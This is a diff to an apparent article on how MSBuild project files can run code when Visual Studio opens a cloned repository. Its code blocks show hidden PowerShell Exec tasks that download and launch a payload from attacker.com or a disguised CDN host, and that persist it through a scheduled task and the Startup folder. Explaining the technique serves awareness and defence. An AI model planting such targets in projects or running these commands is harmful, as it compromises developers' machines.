@@ -17,7 +17,7 @@ When a user clones a repository and opens the solution, Visual Studio loads ever
 MSBuild organizes work into targets, where each target contains one or more tasks that run sequentially:
 ```xml
 <Target Name="BeforeBuild">
-  <Exec Command="powershell -windowstyle hidden -command wget [http://attacker.com/payload.exe](http://attacker.com/payload.exe) -o $env:TEMP\update.exe" />
+  <Exec Command="powershell -windowstyle hidden -command wget http://attacker.com/payload.exe -o $env:TEMP\update.exe" />
   <Exec Command="powershell -windowstyle hidden -command start $env:TEMP\update.exe" />
 </Target>
 ```
@@ -33,7 +33,7 @@ This import brings in hundreds of targets, and BeforeBuild is a common extension
 
 The `InitialTargets` attribute forces execution when the project loads:
 ```xml
-<Project ToolsVersion="15.0" InitialTargets="Build" xmlns="[http://schemas.microsoft.com/developer/msbuild/2003](http://schemas.microsoft.com/developer/msbuild/2003)">
+<Project ToolsVersion="15.0" InitialTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 ```
 
 Setting `<Project InitialTargets="Build">{:xml}` makes MSBuild evaluate the Build target immediately. If your Build target or any of its dependencies contain malicious commands, they execute as soon as Visual Studio opens the file.
@@ -60,7 +60,7 @@ The target name can be anything, but BeforeBuild integrates with the existing bu
 Multiple Exec tasks run in sequence:
 ```xml
 <Target Name="BeforeBuild">
-  <Exec Command="powershell -command $p='$env:TEMP\svc.exe'; wget [http://cdn.example.com/update.exe](http://cdn.example.com/update.exe) -o $p" />
+  <Exec Command="powershell -command $p='$env:TEMP\svc.exe'; wget http://cdn.example.com/update.exe -o $p" />
   <Exec Command="powershell -command start $env:TEMP\svc.exe" />
   <Exec Command="schtasks /create /tn WindowsUpdate /tr $env:TEMP\svc.exe /sc minute /mo 10 /f" />
   <Exec Command="powershell -command copy $env:TEMP\svc.exe $env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\svc.exe" />
